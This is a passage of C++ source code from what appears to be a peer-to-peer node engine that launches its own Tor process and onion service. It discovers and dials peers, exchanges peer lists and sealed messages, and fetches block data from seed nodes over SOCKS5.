            if (rtt < 1) rtt = 1;
            hsReachable_.store(ok);
            hsLatencyMs_.store(ok ? rtt : -1);
            selfRow.latency_ms = ok ? rtt : -1;
            selfRow.last_ok_ms = ok ? nowMillis() : 0;
        }

        std::vector<PeerEntry> seedRows;
        for (const auto& s : seeds) {
            if (sessionBootStop_.load()) break;
            if (!ownOnion_.empty() && onionHostOnly(s.host) == onionHostOnly(ownOnion_)) continue;
            PeerEntry pe;
            pe.address = s.host + ":" + std::to_string(s.port);
            pe.transport = "tor";
            pe.role = "SEED";
            auto t0 = std::chrono::steady_clock::now();
            pe.alive = probeSocks5(s.host, s.port);
            auto t1 = std::chrono::steady_clock::now();
            if (pe.alive) {
                pe.latency_ms = (int)std::chrono::duration_cast<std::chrono::milliseconds>(t1 - t0).count();
                if (pe.latency_ms < 1) pe.latency_ms = 1;
                pe.last_ok_ms = nowMillis();
                // SOCKS reachability is enough to show this seed as a live remote.
                const std::string host = onionHostOnly(s.host);
                mergeKnownPeer(host, "probe", true);
                std::lock_guard<std::mutex> klock(knownPeersMtx_);
                auto it = knownPeers_.find(host);
                if (it != knownPeers_.end()) {
                    it->second.latency_ms = pe.latency_ms;
                    pe.alias = it->second.alias;
                    pe.avatar = it->second.avatar;
                }
            } else {
                pe.latency_ms = -1;
                pe.last_ok_ms = 0;
            }
            seedRows.push_back(pe);
        }

        std::vector<PeerEntry> live;
        if (!selfRow.address.empty()) live.push_back(selfRow);
        for (const auto& pe : seedRows) {
            if (!pe.alive) continue;
            PeerEntry remote = pe;
            remote.role = "PEER";
            live.push_back(remote);
        }
        {
            std::lock_guard<std::mutex> lock(peerCacheMtx_);
            for (const auto& old : cachedPeers_) {
                if (old.role == "YOU" || old.role == "LOCAL" || old.role == "SEED") continue;
                const std::string oh = onionHostOnly(old.address);
                if (!ownOnion_.empty() && oh == onionHostOnly(ownOnion_)) continue;
                bool dup = false;
                for (const auto& e : live) {
                    if (onionHostOnly(e.address) == oh) { dup = true; break; }
                }
                if (dup) continue;
                live.push_back(old);
            }
            cachedPeers_ = std::move(live);
            cachedSeeds_ = std::move(seedRows);
        }
        peerProbeBusy_.store(false);
    });
}

#ifndef _WIN32
void killTorUsingRc(const std::string& rcPath) {
    if (rcPath.empty()) return;
    DIR* proc = opendir("/proc");
    if (!proc) return;
    std::vector<pid_t> pids;
    while (dirent* e = readdir(proc)) {
        if (e->d_name[0] < '1' || e->d_name[0] > '9') continue;
        pid_t pid = static_cast<pid_t>(std::atoi(e->d_name));
        if (pid <= 1) continue;
        std::ifstream cmd(std::string("/proc/") + e->d_name + "/cmdline", std::ios::binary);
        if (!cmd) continue;
        std::string raw((std::istreambuf_iterator<char>(cmd)), std::istreambuf_iterator<char>());
        if (raw.find(rcPath) == std::string::npos) continue;
        pids.push_back(pid);
    }
    closedir(proc);
    for (pid_t pid : pids) kill(pid, SIGTERM);
    for (int i = 0; i < 20; ++i) {
        bool alive = false;
        for (pid_t pid : pids) {
            if (kill(pid, 0) == 0) alive = true;
        }
        if (!alive) break;
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
    for (pid_t pid : pids) {
        if (kill(pid, 0) == 0) {
            kill(pid, SIGKILL);
            (void)waitpid(pid, nullptr, WNOHANG);
        }
    }
}
#endif

void SynapsedEngine::stopSessionTor() const {
#ifndef _WIN32
    if (controlFd_ >= 0 && !onionServiceId_.empty()) {
        (void)controlTransact(controlFd_, "DEL_ONION " + onionServiceId_);
    }
    std::string rcPath = sessionTorDataDir_.empty()
        ? (dataDir_ + "/session-tor/torrc")
        : (sessionTorDataDir_ + "/torrc");
    if (sessionTorPid_ > 1) {
        pid_t pid = static_cast<pid_t>(sessionTorPid_);
        kill(pid, SIGTERM);
        for (int i = 0; i < 30; ++i) {
            if (kill(pid, 0) < 0 && errno == ESRCH) break;
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        kill(pid, SIGKILL);
        (void)waitpid(pid, nullptr, WNOHANG);
    }
    sessionTorPid_ = -1;
    killTorUsingRc(rcPath);
    if (!sessionTorDataDir_.empty()) {
        std::error_code ec;
        std::filesystem::remove_all(sessionTorDataDir_, ec);
    }
#endif
    sessionSocksPort_ = 0;
    sessionControlPort_ = 0;
    sessionCookiePath_.clear();
    gSocksPort.store(9050);
    gControlPort.store(0);
    gCookiePath.clear();
}

bool SynapsedEngine::startSessionTor() const {
#ifdef _WIN32
    return false;
#else
    stopSessionTor();

    std::string torBin = findTorBinary();
    if (torBin.empty()) return false;

    uint16_t socks = pickFreeLocalPort();
    uint16_t ctrl = pickFreeLocalPort();
    if (socks == 0 || ctrl == 0 || socks == ctrl) {
        socks = 18750;
        ctrl = 18751;
    }

    sessionTorDataDir_ = dataDir_ + "/session-tor";
    std::error_code ec;
    std::filesystem::remove_all(sessionTorDataDir_, ec);
    std::filesystem::create_directories(sessionTorDataDir_ + "/data", ec);

    sessionCookiePath_ = sessionTorDataDir_ + "/data/control_auth_cookie";
    std::string rcPath = sessionTorDataDir_ + "/torrc";
    std::string logPath = sessionTorDataDir_ + "/tor.log";
    {
        std::ofstream f(rcPath);
        if (!f) return false;
        f << "SocksPort 127.0.0.1:" << socks << "\n"
          << "ControlPort 127.0.0.1:" << ctrl << "\n"
          << "CookieAuthentication 1\n"
          << "CookieAuthFile " << sessionCookiePath_ << "\n"
          << "DataDirectory " << sessionTorDataDir_ << "/data\n"
          << "PidFile " << sessionTorDataDir_ << "/tor.pid\n"
          << "RunAsDaemon 1\n"
          << "Log notice file " << logPath << "\n"
          << "SafeLogging 1\n"
          << "DormantCanceledByStartup 1\n"
          << "AvoidDiskWrites 0\n";
        std::string bridgeLines;
        std::string connPref = "tor";
        {
            std::ifstream sf(dataDir_ + "/settings.json");
            if (sf.good()) {
                std::string content((std::istreambuf_iterator<char>(sf)),
                                     std::istreambuf_iterator<char>());
                nlohmann::json j = nlohmann::json::parse(content, nullptr, false);
                if (!j.is_discarded() && j.is_object()) {
                    if (j.contains("bridge_lines") && j["bridge_lines"].is_string())
                        bridgeLines = j["bridge_lines"].get<std::string>();
                    if (j.contains("connection_type") && j["connection_type"].is_string())
                        connPref = j["connection_type"].get<std::string>();
                }
            }
        }
        if (connPref == "tor_bridges" && !bridgeLines.empty()) {
            std::string obfs = findObfs4Proxy();
            if (!obfs.empty()) {
                f << "UseBridges 1\n";
                f << "ClientTransportPlugin obfs4 exec " << obfs << "\n";
                std::istringstream iss(bridgeLines);
                std::string line;
                while (std::getline(iss, line)) {
                    line = trim(line);
                    if (line.empty() || line[0] == '#') continue;
                    if (line.rfind("Bridge ", 0) == 0) f << line << "\n";
                    else f << "Bridge " << line << "\n";
                }
            }
        }
    }

    pid_t child = fork();
    if (child < 0) return false;
    if (child == 0) {
        int nullfd = open("/dev/null", O_RDWR);
        if (nullfd >= 0) {
            dup2(nullfd, STDIN_FILENO);
            dup2(nullfd, STDOUT_FILENO);
            dup2(nullfd, STDERR_FILENO);
            if (nullfd > 2) close(nullfd);
        }
        execl(torBin.c_str(), torBin.c_str(), "-f", rcPath.c_str(),
              static_cast<char*>(nullptr));
        _exit(127);
    }

    int st = 0;
    if (waitpid(child, &st, 0) < 0 || !WIFEXITED(st) || WEXITSTATUS(st) != 0) {
        return false;
    }

    std::string pidPath = sessionTorDataDir_ + "/tor.pid";
    sessionTorPid_ = -1;
    for (int i = 0; i < 50 && !sessionBootStop_.load(); ++i) {
        std::ifstream pf(pidPath);
        int64_t parsed = 0;
        if (pf && (pf >> parsed) && parsed > 1) {
            sessionTorPid_ = parsed;
            break;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
    if (sessionTorPid_ <= 1) return false;

    sessionSocksPort_ = socks;
    sessionControlPort_ = ctrl;
    gSocksPort.store(socks);
    gControlPort.store(ctrl);
    gCookiePath = sessionCookiePath_;

    bool socksUp = false;
    bool bootOk = false;
    for (int i = 0; i < 150 && !sessionBootStop_.load(); ++i) {
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
        if (kill(static_cast<pid_t>(sessionTorPid_), 0) < 0 && errno == ESRCH) {
            sessionTorPid_ = -1;
            return false;
        }
        if (!socksUp) {
            int sfd = connectLocalPort(socks, 1);
            if (sfd >= 0) {
                CLOSESOCK(sfd);
                socksUp = true;
            }
        }
        if (!std::filesystem::exists(sessionCookiePath_)) continue;
        int cfd = connectLocalPort(ctrl, 1);
        if (cfd < 0) continue;
        if (!controlAuthenticate(cfd, sessionCookiePath_)) {
            CLOSESOCK(cfd);
            continue;
        }
        std::string resp = controlTransact(cfd, "GETINFO status/bootstrap-phase");
        CLOSESOCK(cfd);
        auto pos = resp.find("PROGRESS=");
        int progress = 0;
        if (pos != std::string::npos) progress = std::atoi(resp.c_str() + pos + 9);
        torBootstrap_ = std::to_string(progress) + "%";
        if (progress >= 100) {
            bootOk = true;
            break;
        }
        if (socksUp && progress >= 90 && i > 40) {
            bootOk = true;
            break;
        }
    }

    if (!bootOk && !socksUp) {
        stopSessionTor();
        return false;
    }
    connectionType_ = "tor";
    return true;
#endif
}

void SynapsedEngine::bootTorMesh() {
    if (!startSessionTor()) {
        // Fall back to whatever ControlPort is already on the machine.
        int ports[] = {9151, 9051};
        bool any = false;
        for (int p : ports) {
            int fd = connectLocalPort(static_cast<uint16_t>(p), 1);
            if (fd >= 0) {
                CLOSESOCK(fd);
                gControlPort.store(p);
                any = true;
                break;
            }
        }
        if (!any) {
            connectionType_ = "disconnected";
            return;
        }
        connectionType_ = "tor";
    }

    startOnionService();

    if (ownOnion_.empty()) return;
    if (sessionBootStop_.load()) return;

    loadPeerCache();

    blockFetchStop_ = false;
    if (!blockFetchThread_.joinable()) {
        blockFetchThread_ = std::thread([this]() {
            while (!blockFetchStop_.load() && !sessionBootStop_.load()) {
                const auto seeds = loadConfiguredSeeds(dataDir_);
                const std::string self = onionHostOnly(ownOnion_);
                std::set<std::string> dialed;

                // Seeds are remotes. Announce, then dialPeer every loop (skip only us).
                for (const auto& s : seeds) {
                    if (blockFetchStop_.load()) break;
                    const std::string host = onionHostOnly(s.host);
                    if (!self.empty() && host == self) continue;
                    fetchBlocksFromSeed(s.host);
                    if (blockFetchStop_.load()) break;
                    announcePresenceToSeed(s.host);
                    announceToSeed(s.host, s.port);
                    if (host.find(".onion") == std::string::npos) continue;
                    mergeKnownPeer(host, "seed", false);
                    dialPeer(host);
                    dialed.insert(host);
                }
                if (blockFetchStop_.load()) break;

                std::vector<std::string> peers;
                for (const auto& s : seeds) {
                    if (blockFetchStop_.load()) break;
                    const std::string host = onionHostOnly(s.host);
                    if (!self.empty() && host == self) continue;
                    auto more = fetchPeersFromSeed(s.host);
                    peers.insert(peers.end(), more.begin(), more.end());
                }
                for (const auto& o : peers) {
                    const std::string host = onionHostOnly(o);
                    if (!self.empty() && host == self) continue;
                    mergeKnownPeer(host, "directory", false);
                }
                if (blockFetchStop_.load()) break;

                std::vector<std::string> extra;
                {
                    std::lock_guard<std::mutex> lock(knownPeersMtx_);
                    for (const auto& kv : knownPeers_) {
                        const std::string host = onionHostOnly(kv.first);
                        if (!self.empty() && host == self) continue;
                        if (dialed.count(host)) continue;
                        extra.push_back(host);
                    }
                }
                {
                    static std::mt19937 dialRng(std::random_device{}());
                    std::shuffle(extra.begin(), extra.end(), dialRng);
                    if (extra.size() > 3) extra.resize(3);
                }
                for (const auto& o : extra) {
                    if (blockFetchStop_.load()) break;
                    dialPeer(o);
                }
                savePeerCache();
                if (blockFetchStop_.load()) break;
                for (int s = 0; s < 10 && !blockFetchStop_.load(); ++s)
                    std::this_thread::sleep_for(std::chrono::seconds(1));
            }
        });
    }

    // After Tor is up. Never start NAAN from init() — that deadlocks mtx_.
    std::ifstream sf(dataDir_ + "/settings.json");
    if (sf.good()) {
        std::string content((std::istreambuf_iterator<char>(sf)),
                             std::istreambuf_iterator<char>());
        nlohmann::json j = nlohmann::json::parse(content, nullptr, false);
        bool want = false;
        if (!j.is_discarded() && j.is_object() && j.contains("naan_enabled")) {
            if (j["naan_enabled"].is_boolean()) want = j["naan_enabled"].get<bool>();
            else if (j["naan_enabled"].is_number()) want = j["naan_enabled"].get<int>() != 0;
        }
        if (want) startNaan();
    }
}

void SynapsedEngine::startOnionService() const {
    if (!ownOnion_.empty()) return;

    std::error_code ec;
    std::filesystem::remove(dataDir_ + "/onion_key", ec);
    onionPrivKey_.clear();
    onionServiceId_.clear();

    listenFd_ = socket(AF_INET, SOCK_STREAM, 0);
    if (listenFd_ < 0) return;

    int opt = 1;
    setsockopt(listenFd_, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in la{};
    la.sin_family = AF_INET;
    la.sin_port = htons(18333);
    inet_pton(AF_INET, "127.0.0.1", &la.sin_addr);

    if (bind(listenFd_, (struct sockaddr*)&la, sizeof(la)) < 0) {
        la.sin_port = htons(18334);
        if (bind(listenFd_, (struct sockaddr*)&la, sizeof(la)) < 0) {
            CLOSESOCK(listenFd_);
            listenFd_ = -1;
            return;
        }
    }
    listen(listenFd_, 16);

    uint16_t localPort = ntohs(la.sin_port);
    listenPort_ = localPort;

    std::vector<uint16_t> ctrlPorts;
    if (sessionControlPort_ > 0) ctrlPorts.push_back(sessionControlPort_);
    if (gControlPort.load() > 0) ctrlPorts.push_back(static_cast<uint16_t>(gControlPort.load()));
    ctrlPorts.push_back(9151);
    ctrlPorts.push_back(9051);

    int cfd = -1;
    for (uint16_t p : ctrlPorts) {
        std::string cookie = sessionCookiePath_.empty() ? gCookiePath : sessionCookiePath_;
        cfd = connectLocalPort(p, 3);
        if (cfd < 0) continue;
        if (controlAuthenticate(cfd, cookie)) break;
        CLOSESOCK(cfd);
        cfd = connectLocalPort(p, 3);
        if (cfd < 0) continue;
        if (controlAuthenticate(cfd, "")) break;
        CLOSESOCK(cfd);
        cfd = -1;
    }
    if (cfd < 0) {
        CLOSESOCK(listenFd_);
        listenFd_ = -1;
        listenPort_ = 0;
        return;
    }

    std::string addCmd = "ADD_ONION NEW:ED25519-V3 Flags=DiscardPK Port=8333,127.0.0.1:" +
                         std::to_string(localPort);
    std::string resp = controlTransact(cfd, addCmd);
    controlFd_ = cfd;

    for (const auto& token : {std::string("250-ServiceID="), std::string("ServiceID=")}) {
        auto pos = resp.find(token);
        if (pos != std::string::npos) {
            size_t start = pos + token.size();
            size_t end = resp.find_first_of("\r\n ", start);
            onionServiceId_ = resp.substr(start, end - start);
            ownOnion_ = onionHostOnly(onionServiceId_ + ".onion");
            break;
        }
    }

    if (ownOnion_.empty()) {
        CLOSESOCK(listenFd_); listenFd_ = -1;
        listenPort_ = 0;
        if (controlFd_ >= 0) { CLOSESOCK(controlFd_); controlFd_ = -1; }
        return;
    }

    {
        std::ofstream sf(dataDir_ + "/session.onion", std::ios::trunc);
        if (sf) sf << ownOnion_ << "\n";
    }
    {
        std::lock_guard<std::mutex> lock(knownPeersMtx_);
        knownPeers_.erase(ownOnion_);
    }

    if (!ownOnion_.empty()) {
        std::thread([this]() {
            for (const auto& s : loadConfiguredSeeds(dataDir_)) {
                if (onionHostOnly(s.host) == onionHostOnly(ownOnion_)) continue;
                announceToSeed(s.host, s.port);
            }
        }).detach();
    }

    listenerStop_.store(false);
    if (listenerThread_.joinable()) {
        listenerStop_.store(true);
        if (listenFd_ >= 0) {
            // already listening on this fd
        }
    }
    listenerThread_ = std::thread([this]() { p2pListenerLoop(); });
}

void SynapsedEngine::stopListener() const {
    listenerStop_.store(true);
    if (listenFd_ >= 0) {
        CLOSESOCK(listenFd_);
        listenFd_ = -1;
    }
    if (controlFd_ >= 0 && !onionServiceId_.empty()) {
        (void)controlTransact(controlFd_, "DEL_ONION " + onionServiceId_);
    }
    if (controlFd_ >= 0) {
        CLOSESOCK(controlFd_);
        controlFd_ = -1;
    }
    if (listenerThread_.joinable()) listenerThread_.join();
    ownOnion_.clear();
    onionServiceId_.clear();
    listenPort_ = 0;
    hsReachable_.store(false);
    hsLatencyMs_.store(-1);
    std::error_code ec;
    std::filesystem::remove(dataDir_ + "/session.onion", ec);
    std::filesystem::remove(dataDir_ + "/onion_key", ec);
}

void SynapsedEngine::p2pListenerLoop() const {
    while (!listenerStop_.load()) {
        if (listenFd_ < 0) break;
        struct timeval tv{1, 0};
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(listenFd_, &fds);

        int r = select(listenFd_ + 1, &fds, nullptr, nullptr, &tv);
        if (r <= 0) continue;

        struct sockaddr_in peer{};
        socklen_t plen = sizeof(peer);
        int cfd = accept(listenFd_, (struct sockaddr*)&peer, &plen);
        if (cfd < 0) continue;

        std::string msg;
        char buf[4096];
        while (msg.size() < 98304) {
            ssize_t n = recv(cfd, buf, sizeof(buf), 0);
            if (n <= 0) break;
            msg.append(buf, buf + n);
            if (msg.find('\n') != std::string::npos) break;
        }
        if (!msg.empty()) {
            if (msg.find("GET_PEERS") == 0) {

                std::string rest = trim(msg.substr(9));
                std::string dialer;
                if (!rest.empty()) {
                    std::istringstream iss(rest);
                    iss >> dialer;
                    mergeKnownPeer(dialer, "inbound", true);
                }
                std::vector<std::string> onions;
                {
                    std::lock_guard<std::mutex> lock(knownPeersMtx_);
                    for (const auto& kv : knownPeers_) onions.push_back(kv.first);
                }
                static std::mt19937 pexRng(std::random_device{}());
                std::shuffle(onions.begin(), onions.end(), pexRng);
                if (onions.size() > 50) onions.resize(50);
                std::string reply = "PEERS";
                if (!ownOnion_.empty()) reply += " " + ownOnion_;
                for (const auto& o : onions) reply += " " + o;
                reply += "\n";
                send(cfd, reply.c_str(), reply.size(), 0);
                if (!dialer.empty()) {
                    std::string peer = onionHostOnly(dialer);
                    std::thread([this, peer]() { pushLocalProfile(peer); }).detach();
                }
            } else if (msg.find("SYNAPSE_PEER ") == 0) {
                std::string peerAddr = trim(msg.substr(13));
                mergeKnownPeer(peerAddr, "inbound", true);
                std::string reply = "SYNAPSE_ACK " + ownOnion_ + ":8333\n";
                send(cfd, reply.c_str(), reply.size(), 0);
                std::string peer = onionHostOnly(peerAddr);
                std::thread([this, peer]() { pushLocalProfile(peer); }).detach();
            } else if (msg.find("NODE_PROFILE ") == 0) {
                ingestNodeProfile(trim(msg.substr(13)));
                const char ack[] = "PROFILE_ACK\n";
                send(cfd, ack, sizeof(ack) - 1, 0);
            } else if (msg.find("RELAY_TX") == 0) {
                size_t sp = msg.find(' ');
                if (sp != std::string::npos) {
                    std::string body = trim(msg.substr(sp + 1));
                    ingestPrivateTxJson(body);
                    const char ack[] = "TX_ACK\n";
                    send(cfd, ack, sizeof(ack) - 1, 0);
                }
            } else if (msg.find("NODE_MSG ") == 0) {
                std::string body = trim(msg.substr(9));
                nlohmann::json j = nlohmann::json::parse(body, nullptr, false);
                if (!j.is_discarded() && j.is_object()) {
                    std::string id = j.value("id", "");
                    std::string from = onionHostOnly(j.value("from", ""));
                    std::string to = onionHostOnly(j.value("to", ""));
                    std::string text;
                    bool sealedOk = false;
                    bool hybrid = false;
                    std::string sealB64;
                    if (j.contains("seal") && j["seal"].is_string())
                        sealB64 = j["seal"].get<std::string>();
                    const bool hasKem = j.contains("kem") && j["kem"].is_string() &&
                                        !j["kem"].get<std::string>().empty();
                    if (hasKem) {
                        std::string unwrapped;
                        if (unwrapSealHybrid(j["kem"].get<std::string>(), sealB64, unwrapped)) {
                            sealB64 = std::move(unwrapped);
                            hybrid = true;
                        } else {
                            sealB64.clear();
                        }
                    }
                    if (!sealB64.empty()) {
                        std::string inner;
                        if (openSealedMsg(sealB64, inner)) {
                            nlohmann::json p = nlohmann::json::parse(inner, nullptr, false);
                            if (!p.is_discarded() && p.is_object()) {
                                text = p.value("body", "");
                                if (from.empty()) from = onionHostOnly(p.value("from", ""));
                                sealedOk = !text.empty();
                            }
                        }
                    }
                    // v1 plaintext body is dropped. Never write it to disk.
                    if (sealedOk && !ownOnion_.empty() &&
                        (to.empty() || to == onionHostOnly(ownOnion_))) {
                        std::string peer = from;
                        std::ofstream mf(dataDir_ + "/messages.jsonl", std::ios::app);
                        if (mf.good()) {
                            mf << "{\"peer\":\"" << jsonEscape(peer)
                               << "\",\"from\":\"" << jsonEscape(peer)
                               << "\",\"to\":\"" << jsonEscape(ownOnion_)
                               << "\",\"dir\":\"in\""
                               << ",\"body\":\"" << jsonEscape(text)
                               << "\",\"ts\":" << nowMillis()
                               << ",\"encrypted\":true,\"hybrid\":"
                               << (hybrid ? "true" : "false")
                               << ",\"quantum_signed\":false}\n";
                        }
                        mergeKnownPeer(peer, "inbound", false);
                    }
                    std::string ack = "MSG_ACK " + id + "\n";
                    send(cfd, ack.c_str(), ack.size(), 0);
                }
            }
        }
        CLOSESOCK(cfd);
    }
}

void SynapsedEngine::announceToSeed(const std::string& seedOnion, uint16_t port) const {
    if (ownOnion_.empty()) return;
    if (onionHostOnly(seedOnion) == onionHostOnly(ownOnion_)) return;

    std::string msg = "SYNAPSE_PEER " + ownOnion_ + ":8333\n";

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return;

    struct timeval tv{5, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    struct sockaddr_in sa{};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(static_cast<uint16_t>(gSocksPort.load()));
    inet_pton(AF_INET, "127.0.0.1", &sa.sin_addr);

    if (connect(fd, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        CLOSESOCK(fd);
        return;
    }

    uint8_t greeting[] = {0x05, 0x02, 0x00, 0x02};
    send(fd, (char*)greeting, 4, 0);
    uint8_t gresp[2];
    if (recv(fd, (char*)gresp, 2, 0) != 2 || gresp[0] != 0x05) {
        CLOSESOCK(fd);
        return;
    }
    if (gresp[1] == 0x02) {
        uint8_t auth[] = {0x01, 0x00, 0x00};
        send(fd, (char*)auth, 3, 0);
        uint8_t aresp[2];
        if (recv(fd, (char*)aresp, 2, 0) != 2 || aresp[1] != 0x00) {
            CLOSESOCK(fd);
            return;
        }
    } else if (gresp[1] != 0x00) {
        CLOSESOCK(fd);
        return;
    }

    std::vector<uint8_t> req;
    req.push_back(0x05); req.push_back(0x01); req.push_back(0x00); req.push_back(0x03);
    req.push_back((uint8_t)seedOnion.size());
    req.insert(req.end(), seedOnion.begin(), seedOnion.end());
    req.push_back((port >> 8) & 0xFF);
    req.push_back(port & 0xFF);
    send(fd, (char*)req.data(), req.size(), 0);

    uint8_t resp[10];
    ssize_t n = recv(fd, (char*)resp, sizeof(resp), 0);
    if (n < 2 || resp[1] != 0x00) {
        CLOSESOCK(fd);
        return;
    }

    send(fd, msg.c_str(), msg.size(), 0);

    char buf[256];
    recv(fd, buf, sizeof(buf) - 1, 0);

    CLOSESOCK(fd);
}

void SynapsedEngine::fetchBlocksFromSeed(const std::string& seedOnion) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return;

    struct timeval tv{15, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    struct sockaddr_in sa{};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(static_cast<uint16_t>(gSocksPort.load()));
    inet_pton(AF_INET, "127.0.0.1", &sa.sin_addr);

    if (connect(fd, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        CLOSESOCK(fd);
        return;
    }

    uint8_t greeting[] = {0x05, 0x02, 0x00, 0x02};
    send(fd, (char*)greeting, 4, 0);
    uint8_t gresp[2];
    if (recv(fd, (char*)gresp, 2, 0) != 2 || gresp[0] != 0x05) { CLOSESOCK(fd); return; }
    if (gresp[1] == 0x02) {
        uint8_t auth[] = {0x01, 0x00, 0x00};
        send(fd, (char*)auth, 3, 0);
        uint8_t aresp[2];
        if (recv(fd, (char*)aresp, 2, 0) != 2 || aresp[1] != 0x00) { CLOSESOCK(fd); return; }
    } else if (gresp[1] != 0x00) { CLOSESOCK(fd); return; }

    std::vector<uint8_t> req;
    req.push_back(0x05); req.push_back(0x01); req.push_back(0x00); req.push_back(0x03);
    req.push_back((uint8_t)seedOnion.size());
    req.insert(req.end(), seedOnion.begin(), seedOnion.end());
    uint16_t rpcPort = 8332;
    req.push_back((rpcPort >> 8) & 0xFF);
    req.push_back(rpcPort & 0xFF);
    send(fd, (char*)req.data(), req.size(), 0);

    uint8_t resp[10];
    ssize_t n = recv(fd, (char*)resp, sizeof(resp), 0);
    if (n < 2 || resp[1] != 0x00) { CLOSESOCK(fd); return; }

    std::string body = "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"blocks.list\",\"params\":{}}";
    std::string httpReq = "POST / HTTP/1.1\r\nHost: " + seedOnion + ":8332\r\n"
        "Content-Type: application/json\r\nContent-Length: " + std::to_string(body.size()) + "\r\n"
        "Connection: close\r\n\r\n" + body;
    send(fd, httpReq.c_str(), httpReq.size(), 0);

    std::string response;
    char buf[4096];
    while (true) {
        ssize_t r = recv(fd, buf, sizeof(buf) - 1, 0);
        if (r <= 0) break;
        buf[r] = '\0';
        response += buf;
    }
    CLOSESOCK(fd);

    auto bodyPos = response.find("\r\n\r\n");
    if (bodyPos == std::string::npos) return;
    std::string jsonBody = response.substr(bodyPos + 4);

    try {
        auto parsed = nlohmann::json::parse(jsonBody);
        if (!parsed.contains("result") || !parsed["result"].contains("blocks")) return;
        auto& blocks = parsed["result"]["blocks"];
        if (!blocks.is_array() || blocks.empty()) return;

        uint64_t newHeight = parsed["result"].value("height", (uint64_t)0);
        if (newHeight < lastBlockHeight_.load()) return;

        {
            std::lock_guard<std::mutex> lock(mtx_);
            lastBlockHeight_ = newHeight;
            seedPeerCount_ = blocks.size();
        }

        std::string tmpPath = dataDir_ + "/blocks.jsonl.tmp";
        std::ofstream blkf(tmpPath, std::ios::trunc);
        if (!blkf.good()) return;
        for (const auto& b : blocks) {
            blkf << b.dump() << "\n";
        }
        blkf.close();
        std::rename(tmpPath.c_str(), (dataDir_ + "/blocks.jsonl").c_str());
    } catch (...) {}
}

std::vector<std::string> SynapsedEngine::fetchPeersFromSeed(const std::string& seedOnion) {
    std::vector<std::string> out;
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return out;

    struct timeval tv{15, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    struct sockaddr_in sa{};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(static_cast<uint16_t>(gSocksPort.load()));
    inet_pton(AF_INET, "127.0.0.1", &sa.sin_addr);

    if (connect(fd, (struct sockaddr*)&sa, sizeof(sa)) < 0) { CLOSESOCK(fd); return out; }

    uint8_t greeting[] = {0x05, 0x02, 0x00, 0x02};
    send(fd, (char*)greeting, 4, 0);
    uint8_t gresp[2];
    if (recv(fd, (char*)gresp, 2, 0) != 2 || gresp[0] != 0x05) { CLOSESOCK(fd); return out; }
    if (gresp[1] == 0x02) {
        uint8_t auth[] = {0x01, 0x00, 0x00};
        send(fd, (char*)auth, 3, 0);
        uint8_t aresp[2];
        if (recv(fd, (char*)aresp, 2, 0) != 2 || aresp[1] != 0x00) { CLOSESOCK(fd); return out; }
    } else if (gresp[1] != 0x00) { CLOSESOCK(fd); return out; }

    std::vector<uint8_t> req;
    req.push_back(0x05); req.push_back(0x01); req.push_back(0x00); req.push_back(0x03);
    req.push_back((uint8_t)seedOnion.size());
    req.insert(req.end(), seedOnion.begin(), seedOnion.end());
    uint16_t rpcPort = 8332;
    req.push_back((rpcPort >> 8) & 0xFF);
    req.push_back(rpcPort & 0xFF);
    send(fd, (char*)req.data(), req.size(), 0);

    uint8_t resp[10];
    ssize_t n = recv(fd, (char*)resp, sizeof(resp), 0);
    if (n < 2 || resp[1] != 0x00) { CLOSESOCK(fd); return out; }

    std::string body = "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"peer.directory\",\"params\":{}}";
    std::string httpReq = "POST / HTTP/1.1\r\nHost: " + seedOnion + ":8332\r\n"
        "Content-Type: application/json\r\nContent-Length: " + std::to_string(body.size()) + "\r\n"
        "Connection: close\r\n\r\n" + body;
    send(fd, httpReq.c_str(), httpReq.size(), 0);

    std::string response;
    char buf[4096];
    while (true) {
        ssize_t r = recv(fd, buf, sizeof(buf) - 1, 0);
        if (r <= 0) break;
        buf[r] = '\0';
        response += buf;
    }
    CLOSESOCK(fd);

    auto bodyPos = response.find("\r\n\r\n");
    if (bodyPos == std::string::npos) return out;
    std::string jsonBody = response.substr(bodyPos + 4);

    try {
        auto parsed = nlohmann::json::parse(jsonBody);
        if (!parsed.contains("result")) return out;
        auto& result = parsed["result"];
        if (!result.contains("peers") || !result["peers"].is_array()) return out;
        for (const auto& p : result["peers"]) {
            if (!p.contains("onion") || !p["onion"].is_string()) continue;
            std::string onion = p["onion"].get<std::string>();
            if (onion.find(".onion") == std::string::npos) continue;
            size_t colon = onion.find(':');
            if (colon != std::string::npos) onion = onion.substr(0, colon);
            out.push_back(onion);
        }
    } catch (...) {}
    return out;
}

void SynapsedEngine::announcePresenceToSeed(const std::string& seedOnion) {
    if (ownOnion_.empty()) return;
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return;

    struct timeval tv{15, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    struct sockaddr_in sa{};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(static_cast<uint16_t>(gSocksPort.load()));
    inet_pton(AF_INET, "127.0.0.1", &sa.sin_addr);
